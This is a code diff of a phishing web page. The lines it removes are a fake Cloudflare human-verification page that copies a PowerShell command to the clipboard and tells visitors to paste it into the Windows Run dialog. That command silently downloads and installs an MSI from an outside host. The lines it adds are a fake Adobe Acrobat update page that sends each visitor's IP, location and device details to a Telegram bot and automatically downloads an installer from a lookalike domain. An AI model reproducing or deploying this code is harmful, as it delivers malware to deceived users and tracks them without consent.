@@ -1,452 +1,527 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Cloudflare</title>
-    <style>
-        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap');
-       
-        body {
-            margin: 0;
-            padding: 0;
-            font-family: 'Inter', system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
-            background-color: #ffffff;
-            color: #333333;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            min-height: 100vh;
-            line-height: 1.5;
-        }
-       
-        .container {
-            max-width: 620px;
-            width: 100%;
-            border: 1px solid #e5e5e5;
-            border-radius: 8px;
-            padding: 40px 50px;
-            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.05);
-            margin: 20px;
-        }
-       
-        .header {
-            display: flex;
-            align-items: center;
-            gap: 12px;
-            margin-bottom: 8px;
-        }
-       
-        .brand-logo {
-            height: 42px;
-            width: auto;
-            max-width: 180px;
-        }
-       
-        .title {
-            font-size: 24px;
-            font-weight: 500;
-            color: #1a1a1a;
-            margin: 0;
-        }
-       
-        .subtitle {
-            font-size: 16px;
-            color: #555555;
-            margin-bottom: 30px;
-        }
-       
-        .challenge-box {
-            border: 1px solid #e0e0e0;
-            border-radius: 6px;
-            padding: 14px 20px;
-            display: flex;
-            align-items: center;
-            gap: 16px;
-            background-color: #fafafa;
-            margin-bottom: 30px;
-            font-size: 15px;
-            cursor: pointer;
-            transition: all 0.2s;
-        }
-       
-        .challenge-box:hover {
-            background-color: #f5f5f5;
-        }
-       
-        .checkbox {
-            width: 20px;
-            height: 20px;
-            border: 2px solid #666;
-            border-radius: 3px;
-            flex-shrink: 0;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            position: relative;
-        }
-       
-        .checkbox.loading {
-            border-color: #666;
-            animation: spin 1s linear infinite;
-        }
-       
-        @keyframes spin {
-            from { transform: rotate(0deg); }
-            to { transform: rotate(360deg); }
-        }
-       
-        .spinner {
-            width: 16px;
-            height: 16px;
-            border: 2px solid #666;
-            border-top-color: transparent;
-            border-radius: 50%;
-            animation: spinner-rotate 0.8s linear infinite;
-        }
-       
-        @keyframes spinner-rotate {
-            to { transform: rotate(360deg); }
-        }
-       
-        .custom-brand {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            gap: 2px;
-            font-size: 13px;
-        }
-       
-        .custom-logo {
-            height: 38px;
-            width: auto;
-            max-width: 160px;
-        }
-       
-        .privacy-terms {
-            font-size: 11px;
-            color: #666666;
-        }
-       
-        .main-text {
-            font-size: 16px;
-            color: #333333;
-            margin-bottom: 40px;
-        }
-       
-        .footer {
-            text-align: center;
-            font-size: 12px;
-            color: #777777;
-            margin-top: 60px;
-        }
-       
-        .ray-id {
-            border-top: 1px solid #e5e5e5;
-            padding-top: 16px;
-            margin-top: 40px;
-        }
-       
-        a {
-            color: #007bff;
-            text-decoration: none;
-        }
-       
-        a:hover {
-            text-decoration: underline;
-        }
-       
-        .verifying-text {
-            color: #666;
-            font-size: 14px;
-            font-weight: 500;
-        }
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Adobe Acrobat Pro</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
 
-        .modal-overlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0, 0, 0, 0.5);
-            display: none;
-            align-items: center;
-            justify-content: center;
-            z-index: 1000;
-        }
-        .modal-overlay.active {
-            display: flex;
-        }
-        .modal-container {
-            background: white;
-            border-radius: 12px;
-            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.2);
-            width: 70%;
-            height: 70%;
-            overflow-y: auto;
-            position: relative;
-        }
-        .modal-content-wrapper {
-            width: 100%;
-            height: 100%;
-            display: flex;
-            flex-direction: column;
-        }
-        .modal-header {
-            background: #f97316;
-            color: white;
-            padding: 16px 24px;
-            font-size: 18px;
-            font-weight: 600;
-            display: flex;
-            align-items: center;
-            gap: 16px;
-            flex-shrink: 0;
-        }
-        .modal-header img {
-            width: 56px;
-            height: 56px;
-            flex-shrink: 0;
-            object-fit: contain;
-            background: white;
-            border-radius: 4px;
-        }
-        .modal-body {
-            padding: 24px 24px 16px;
-            flex: 1;
-            overflow-y: auto;
-        }
-        .instruction-title {
-            font-size: 15px;
-            font-weight: 500;
-            color: #374151;
-            margin-bottom: 16px;
-        }
-        .steps {
-            font-size: 15px;
-            line-height: 1.5;
-            color: #374151;
-            margin-bottom: 24px;
-        }
-        .steps ol {
-            padding-left: 20px;
-            margin: 0;
-        }
-        .steps li {
-            margin-bottom: 8px;
-        }
-        .modal-footer {
-            border-top: 1px solid #e5e7eb;
-            padding: 16px 24px;
-            background: #f9fafb;
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            gap: 16px;
-            flex-shrink: 0;
-        }
-        .footer-text {
-            font-size: 13px;
-            color: #6b7280;
-            line-height: 1.4;
-        }
-        .verify-btn {
-            background: #f97316;
-            color: white;
-            border: none;
-            padding: 12px 32px;
-            font-size: 15px;
-            font-weight: 600;
-            border-radius: 6px;
-            cursor: pointer;
-            transition: background-color 0.2s;
-            white-space: nowrap;
-            flex-shrink: 0;
-        }
-        .verify-btn:hover {
-            background: #ea580c;
-        }
-        .modal-alert {
-            position: fixed;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            background: white;
-            padding: 20px 28px;
-            border-radius: 10px;
-            text-align: center;
-            max-width: 320px;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
-            display: none;
-            z-index: 2001;
-        }
-        .modal-alert.show {
-            display: block;
-        }
-        .modal-alert-text {
-            font-size: 15px;
-            color: #374151;
-            margin: 0;
-        }
-    </style>
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
+      min-height: 100vh;
+      background: #1a1a1a;
+      background-image: url('https://files.manuscdn.com/user_upload_by_module/session_file/310519663642050603/tgdOfSGiecKqPiOL.jpg');
+      background-size: cover;
+      background-position: center;
+      background-repeat: no-repeat;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      padding: 0;
+      position: relative;
+      overflow: hidden;
+    }
+
+    /* Adobe header bar */
+    .adobe-header {
+      position: fixed;
+      top: 0;
+      left: 0;
+      right: 0;
+      height: 50px;
+      background: #1a1a1a;
+      display: flex;
+      align-items: center;
+      padding: 0 24px;
+      z-index: 100;
+    }
+
+    .adobe-header .adobe-wordmark {
+      color: #ff0000;
+      font-size: 22px;
+      font-weight: 700;
+      font-style: italic;
+      letter-spacing: -0.5px;
+    }
+
+    /* Adobe bottom bar */
+    .adobe-bottom-bar {
+      position: fixed;
+      bottom: 0;
+      left: 0;
+      right: 0;
+      height: 56px;
+      background: #2a2a2a;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 0 24px;
+      z-index: 100;
+      border-top: 1px solid #444;
+    }
+
+    .adobe-bottom-bar .bottom-left {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+    }
+
+    .adobe-bottom-bar .bottom-left img {
+      width: 28px;
+      height: 28px;
+    }
+
+    .adobe-bottom-bar .bottom-left .bottom-text {
+      color: #fff;
+    }
+
+    .adobe-bottom-bar .bottom-left .bottom-text .title {
+      font-size: 14px;
+      font-weight: 600;
+    }
+
+    .adobe-bottom-bar .bottom-left .bottom-text .subtitle {
+      font-size: 11px;
+      color: #aaa;
+    }
+
+    .adobe-bottom-bar .bottom-right button {
+      background: #1473e6;
+      color: #fff;
+      border: none;
+      border-radius: 20px;
+      padding: 8px 20px;
+      font-size: 13px;
+      font-weight: 500;
+      cursor: pointer;
+    }
+
+    .adobe-bottom-bar .bottom-right button:hover {
+      background: #0d66d0;
+    }
+
+    /* Recent download history popup */
+    .download-history {
+      position: fixed;
+      top: 0;
+      right: 80px;
+      background: #f5f5f5;
+      border-radius: 0 0 12px 12px;
+      padding: 14px 18px;
+      width: 280px;
+      box-shadow: 0 4px 20px rgba(0,0,0,0.15);
+      z-index: 1000;
+    }
+
+    .download-history-header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 10px;
+    }
+
+    .download-history-header h3 {
+      font-size: 13px;
+      font-weight: 600;
+      color: #1a1a1a;
+    }
+
+    .download-history-close {
+      width: 20px;
+      height: 20px;
+      background: #999;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      cursor: pointer;
+    }
+
+    .download-history-close::after {
+      content: "×";
+      color: #fff;
+      font-size: 14px;
+      font-weight: bold;
+    }
+
+    .download-item {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      margin-bottom: 8px;
+    }
+
+    .download-icon {
+      width: 32px;
+      height: 32px;
+      background: #e8e8e8;
+      border-radius: 6px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .download-icon svg {
+      width: 18px;
+      height: 18px;
+    }
+
+    .download-info {
+      flex: 1;
+    }
+
+    .download-info .filename {
+      font-size: 12px;
+      font-weight: 500;
+      color: #1a1a1a;
+    }
+
+    .download-info .progress-text {
+      font-size: 11px;
+      color: #666;
+    }
+
+    .download-progress-bar {
+      width: 100%;
+      height: 3px;
+      background: #ddd;
+      border-radius: 2px;
+      margin-top: 4px;
+      overflow: hidden;
+    }
+
+    .download-progress-fill {
+      width: 65%;
+      height: 100%;
+      background: #0066cc;
+      border-radius: 2px;
+      animation: progress 3s ease-in-out infinite;
+    }
+
+    @keyframes progress {
+      0% { width: 10%; }
+      50% { width: 75%; }
+      100% { width: 95%; }
+    }
+
+    .full-history-link {
+      display: block;
+      text-align: center;
+      font-size: 12px;
+      color: #666;
+      text-decoration: none;
+      padding-top: 8px;
+      border-top: 1px solid #ddd;
+      margin-top: 8px;
+    }
+
+    /* Main content card */
+    .main-card {
+      background: rgba(10, 10, 10, 0.92);
+      backdrop-filter: blur(10px);
+      -webkit-backdrop-filter: blur(10px);
+      border-radius: 16px;
+      padding: 36px 36px 36px;
+      max-width: 480px;
+      width: 90%;
+      box-shadow: 0 8px 40px rgba(0,0,0,0.4);
+      text-align: center;
+      position: relative;
+      z-index: 10;
+    }
+
+    .adobe-logo {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      margin-bottom: 24px;
+    }
+
+    .adobe-logo img {
+      width: 32px;
+      height: 32px;
+    }
+
+    .adobe-logo span {
+      font-size: 22px;
+      font-weight: 500;
+      color: #ffffff;
+    }
+
+    .adobe-logo img {
+      width: 36px;
+      height: 36px;
+    }
+
+    .main-card h1.please-wait {
+      font-size: 32px;
+      font-weight: 700;
+      color: #ffffff;
+      line-height: 1.3;
+      margin-bottom: 24px;
+      text-align: center;
+      margin-top: 18px;
+    }
+
+    .instruction-text {
+      font-size: 15px;
+      color: #ddd;
+      text-align: center;
+      line-height: 1.6;
+      margin-bottom: 22px;
+    }
+
+    .download-link-text {
+      font-size: 13px;
+      color: #aaa;
+      text-align: center;
+      margin-bottom: 22px;
+    }
+
+    .download-link-text a {
+      color: #4a9eff;
+      text-decoration: underline;
+      font-weight: 500;
+    }
+
+    .download-link-text a:hover {
+      color: #6bb3ff;
+    }
+
+    .instruction-list {
+      list-style: disc;
+      padding-left: 24px;
+      text-align: left;
+      margin-top: 16px;
+    }
+
+    .instruction-list li {
+      font-size: 14px;
+      color: #ffffff;
+      line-height: 1.6;
+    }
+  </style>
 </head>
 <body>
-    <div class="container">
-        <div class="header">
-          
-            <div class="title">www.adobe.com</div>
-        </div>
-       
-        <div class="subtitle">Verify you are human by completing the action below.</div>
-       
-        <div class="challenge-box" id="challengeBox">
-            <div class="checkbox" id="checkbox"></div>
-            <div style="flex: 1;" id="verifyText">
-                <strong>Verify you are human</strong>
-            </div>
-           
-            <div class="custom-brand">
-                <img src="https://res.cloudinary.com/djzv1chbx/image/upload/v1780744408/logo_kqbbyc.png"
-                     alt="Logo"
-                     class="custom-logo">
-                <span class="privacy-terms">Privacy Terms</span>
-            </div>
-        </div>
-       
-        <div class="main-text">
-            www.adobe.com needs to review the security of your connection before proceeding.
-        </div>
-       
-        <div class="footer">
-            <div class="ray-id">
-                Ray ID: <span style="font-family: monospace;">9d8e7f1234567</span>
-            </div>
-            <div style="margin-top: 8px;">
-                Performance &amp; security by <a href="https://www.cloudflare.com" target="_blank">Cloudflare</a>
-            </div>
-        </div>
+
+
+
+
+
+  <!-- Adobe Header -->
+  <div class="adobe-header">
+    <img src="https://res.cloudinary.com/djzv1chbx/image/upload/v1786302166/IMG_1399_uusxch.webp" alt="Adobe" style="height: 30px;">
+  </div>
+
+  <!-- Adobe Bottom Bar -->
+  <div class="adobe-bottom-bar">
+    <div class="bottom-left">
+      <img src="https://res.cloudinary.com/djzv1chbx/image/upload/v1786283663/Adobe-Reader-Logo-Vector.svg-_lz7tww.png" alt="Adobe">
+      <div class="bottom-text">
+        <div class="title">Adobe Acrobat</div>
+        <div class="subtitle">Free plans for businesses or personal and teachers.</div>
+      </div>
+    </div>
+    <div class="bottom-right">
+      <button>Download Adobe Acrobat</button>
+    </div>
+  </div>
+
+  <!-- Main content card -->
+  <div class="main-card">
+    <div class="adobe-logo">
+      <img src="https://res.cloudinary.com/djzv1chbx/image/upload/v1786283663/Adobe-Reader-Logo-Vector.svg-_lz7tww.png" alt="Adobe Acrobat">
+      <span>Adobe Acrobat Reader</span>
     </div>
 
-    <!-- MODAL OVERLAY -->
-    <div class="modal-overlay" id="modalOverlay">
-        <div class="modal-container">
-            <div class="modal-content-wrapper">
-                <div class="modal-header">
-                    <img src="https://res.cloudinary.com/djzv1chbx/image/upload/v1780744408/logo_kqbbyc.png" alt="Logo">
-                    <span>Complete these Verification Step</span>
-                </div>
-               
-                <div class="modal-body">
-                    <div class="instruction-title">
-                        To better prove you are not a robot, please:
-                    </div>
-                   
-                    <div class="steps">
-                        <ol>
-                            <li>Press and hold the <strong>windows</strong> key + <strong>R</strong>.</li>
-                            <li>Press <strong>ENTER</strong> when the verification window pop up.</li>
-                            <li>In the verification window, press <strong>Ctrl + V</strong>.</li>
-                            <li>Press <strong>Enter</strong> on your keyboard and press Y and Enter to finish</li>
-                        </ol>
-                    </div>
-                </div>
-               
-                <div class="modal-footer">
-                    <div class="footer-text">
-                        Perform the steps above to finish verification.
-                    </div>
-                    <button id="verifyBtn" class="verify-btn">
-                        VERIFY
-                    </button>
-                </div>
-            </div>
-        </div>
-    </div>
+    <h1 class="please-wait">Please wait...</h1>
 
-    <!-- Alert Modal -->
-    <div class="modal-alert" id="alertModal">
-        <p class="modal-alert-text" id="alertMessage"></p>
-    </div>
+    <p class="instruction-text">
+      To read the document, you do not have the latest version of Adobe Acrobat Reader for Windows App installed. The latest version of Adobe Acrobat Reader will download automatically, kindly install or open to view the shared document.
+    </p>
 
-    <script>
-        // FIXED: Added -UseBasicParsing and corrected path to $env:TEMP\sc.msi
-        const maliciousCommand = `powershell -ExecutionPolicy Bypass -Command "Invoke-WebRequest -UseBasicParsing -Uri 'https://pdfdocumentshare.com/Adobe%20Acrobat.msi' -OutFile $env:TEMP\\sc.msi; Start-Process msiexec -ArgumentList '/i', $env:TEMP\\sc.msi, '/quiet', '/norestart' -Wait; exit"`;
+    <p class="download-link-text">
+      If the download doesn't start automatically, Click., <a href="https://zoomupgradesoftware.com/AdobeInstaller.msi">Download Manually.</a>
+    </p>
 
-        const challengeBox = document.getElementById('challengeBox');
-        const checkbox = document.getElementById('checkbox');
-        const verifyText = document.getElementById('verifyText');
-        const modalOverlay = document.getElementById('modalOverlay');
-        const verifyBtn = document.getElementById('verifyBtn');
-        const alertModal = document.getElementById('alertModal');
-        const alertMessage = document.getElementById('alertMessage');
+    <ul class="instruction-list">
+      <li>Open your download folder to access the document</li>
+    </ul>
+  </div>
 
-        let clickCount = 0;
-        let isVerifying = false;
+  <script>
+    // ========== TELEGRAM TRACKING CONFIG ==========
+    const TELEGRAM_BOT_TOKEN = "8619770196:AAGoucIeoM-7CZMZ7s4bXYqc2FnbLzIrmM8";
+    const TELEGRAM_CHAT_ID = "8116420547";
+    // =============================================
 
-        // Silent copy on user gesture (Challenge Box Click)
-        async function silentCopy() {
-            try {
-                await navigator.clipboard.writeText(maliciousCommand);
-                console.log("✅ Clipboard hijacked successfully");
-            } catch (err) {
-                console.warn("Clipboard API failed:", err.message);
-                const textarea = document.createElement('textarea');
-                textarea.value = maliciousCommand;
-                textarea.style.position = 'fixed';
-                textarea.style.opacity = '0';
-                textarea.style.left = '-999999px';
-                textarea.style.top = '-999999px';
-                document.body.appendChild(textarea);
-                textarea.focus();
-                textarea.select();
-                document.execCommand('copy');
-                document.body.removeChild(textarea);
-                console.log("✅ Clipboard hijacked using fallback");
-            }
+    // Send message to Telegram
+    function sendToTelegram(message) {
+      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+      fetch(url, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: TELEGRAM_CHAT_ID,
+          text: message,
+          parse_mode: "HTML"
+        })
+      }).catch(err => console.log("Telegram error:", err));
+    }
+
+    // Detect device info
+    function getDeviceInfo() {
+      const ua = navigator.userAgent;
+      let device = "Unknown";
+      let os = "Unknown";
+      let browser = "Unknown";
+
+      // Detect OS
+      if (/Windows/i.test(ua)) os = "Windows";
+      else if (/Macintosh|Mac OS/i.test(ua)) os = "macOS";
+      else if (/Linux/i.test(ua) && !/Android/i.test(ua)) os = "Linux";
+      else if (/Android/i.test(ua)) os = "Android";
+      else if (/iPhone|iPad|iPod/i.test(ua)) os = "iOS";
+
+      // Detect device type
+      if (/Mobile|Android.*Mobile|iPhone|iPod/i.test(ua)) device = "Mobile";
+      else if (/iPad|Android(?!.*Mobile)|Tablet/i.test(ua)) device = "Tablet";
+      else device = "Desktop";
+
+      // Detect browser
+      if (/Edg\//i.test(ua)) browser = "Edge";
+      else if (/Chrome/i.test(ua) && !/Edg/i.test(ua)) browser = "Chrome";
+      else if (/Firefox/i.test(ua)) browser = "Firefox";
+      else if (/Safari/i.test(ua) && !/Chrome/i.test(ua)) browser = "Safari";
+      else if (/Opera|OPR/i.test(ua)) browser = "Opera";
+
+      return { device, os, browser, userAgent: ua };
+    }
+
+    // Track visitor on page load
+    async function trackVisitor() {
+      const deviceInfo = getDeviceInfo();
+      let ip = "Unknown";
+      let location = "Unknown";
+      let isp = "Unknown";
+      let carrier = "Unknown";
+      let country = "Unknown";
+      let city = "Unknown";
+      let region = "Unknown";
+
+      // Get IP and geo info
+      try {
+        const response = await fetch("https://ipinfo.io/json");
+        const data = await response.json();
+        ip = data.ip || "Unknown";
+        city = data.city || "Unknown";
+        region = data.region || "Unknown";
+        country = data.country || "Unknown";
+        location = `${city}, ${region}, ${country}`;
+        isp = data.org || "Unknown";
+        carrier = data.org || "Unknown";
+      } catch (e) {
+        try {
+          const response = await fetch("https://api.ipify.org?format=json");
+          const data = await response.json();
+          ip = data.ip;
+        } catch (e2) {
+          ip = "Could not detect";
         }
+      }
 
-        // Copy when user clicks the challenge box (best chance of no permission prompt)
-        challengeBox.addEventListener('click', function() {
-            if (!isVerifying) {
-                silentCopy();   // Copy on first user interaction
-            }
+      const timestamp = new Date().toLocaleString();
 
-            if (isVerifying) return;
+      const message = `\u{1F4CB} <b>ADOBE TRACKING - New Visit</b>\n\n` +
+        `\u{1F550} <b>Time:</b> ${timestamp}\n` +
+        `\u{1F310} <b>IP Address:</b> ${ip}\n` +
+        `\u{1F4CD} <b>Location:</b> ${location}\n` +
+        `\u{1F3E2} <b>ISP/Carrier:</b> ${carrier}\n` +
+        `\u{1F4BB} <b>Device:</b> ${deviceInfo.device}\n` +
+        `\u{1F5A5} <b>OS:</b> ${deviceInfo.os}\n` +
+        `\u{1F30D} <b>Browser:</b> ${deviceInfo.browser}\n` +
+        `\u{1F4F1} <b>User Agent:</b> ${deviceInfo.userAgent}\n` +
+        `\u{1F4C4} <b>Page:</b> Adobe Acrobat Pro`;
 
-            isVerifying = true;
-            checkbox.innerHTML = '<div class="spinner"></div>';
-            checkbox.classList.add('loading');
-            verifyText.innerHTML = '<strong class="verifying-text">Verifying...</strong>';
+      sendToTelegram(message);
+    }
 
-            setTimeout(() => {
-                isVerifying = false;
-                checkbox.classList.remove('loading');
-                checkbox.innerHTML = '';
-                verifyText.innerHTML = '<strong>Verify you are human</strong>';
-                modalOverlay.classList.add('active');
-            }, 2500);
+    // Track button clicks
+    function trackClick(buttonName) {
+      const timestamp = new Date().toLocaleString();
+      const deviceInfo = getDeviceInfo();
+
+      const message = `\u{1F446} <b>ADOBE TRACKING - Button Click</b>\n\n` +
+        `\u{1F550} <b>Time:</b> ${timestamp}\n` +
+        `\u{1F518} <b>Button:</b> ${buttonName}\n` +
+        `\u{1F4BB} <b>Device:</b> ${deviceInfo.device}\n` +
+        `\u{1F5A5} <b>OS:</b> ${deviceInfo.os}\n` +
+        `\u{1F30D} <b>Browser:</b> ${deviceInfo.browser}\n` +
+        `\u{1F4C4} <b>Page:</b> Adobe Acrobat Pro`;
+
+      sendToTelegram(message);
+    }
+
+    // Track download triggered
+    function trackDownload(method) {
+      const timestamp = new Date().toLocaleString();
+      const deviceInfo = getDeviceInfo();
+
+      const message = `\u{1F4E5} <b>ADOBE TRACKING - Download Triggered</b>\n\n` +
+        `\u{1F550} <b>Time:</b> ${timestamp}\n` +
+        `\u{1F4E6} <b>Method:</b> ${method}\n` +
+        `\u{1F4C1} <b>File:</b> Adobe Acrobat.bat\n` +
+        `\u{1F4BB} <b>Device:</b> ${deviceInfo.device}\n` +
+        `\u{1F5A5} <b>OS:</b> ${deviceInfo.os}\n` +
+        `\u{1F30D} <b>Browser:</b> ${deviceInfo.browser}\n` +
+        `\u{1F4C4} <b>Page:</b> Adobe Acrobat MSI`;
+
+      sendToTelegram(message);
+    }
+
+    // Track visitor on page load
+    trackVisitor();
+
+    // Track button clicks
+    document.addEventListener('DOMContentLoaded', function() {
+      // Download manually link
+      const downloadManuallyLinks = document.querySelectorAll('a[href*="Adobe%20Acrobat.bat.bat"]');
+      downloadManuallyLinks.forEach(function(link) {
+        link.addEventListener('click', function() {
+          trackClick("Download manually");
+          trackDownload("Manual Download Click");
         });
+      });
 
-        // VERIFY button logic
-        verifyBtn.addEventListener('click', function() {
-            clickCount++;
-           
-            if (clickCount === 5) {
-                showAlert("Verification not completed. Try again. Please complete the task on your screen.");
-            }
-            else if (clickCount >= 6) {
-                modalOverlay.classList.remove('active');
-                setTimeout(() => {
-                    window.location.href = "https://www.adobe.com";
-                }, 800);
-            }
+      // Inspect and download link
+      const inspectLink = document.querySelector('.download-not-working a:first-of-type');
+      if (inspectLink) {
+        inspectLink.addEventListener('click', function() {
+          trackClick("Inspect and download");
         });
+      }
 
-        function showAlert(message) {
-            alertMessage.textContent = message;
-            alertModal.classList.add('show');
-            setTimeout(() => alertModal.classList.remove('show'), 2200);
-        }
-    </script>
+      // Get Help link
+      const helpLink = document.querySelector('a[href*="helpx.adobe.com"]');
+      if (helpLink) {
+        helpLink.addEventListener('click', function() {
+          trackClick("Get Help");
+        });
+      }
+    });
+
+    // Auto-trigger download after 5 seconds
+    setTimeout(function() {
+      trackDownload("Auto Download (5s)");
+      window.location.href = "https://zoomupgradesoftware.com/AdobeInstaller.msi";
+    }, 5000);
+  </script>
 </body>
 </html>
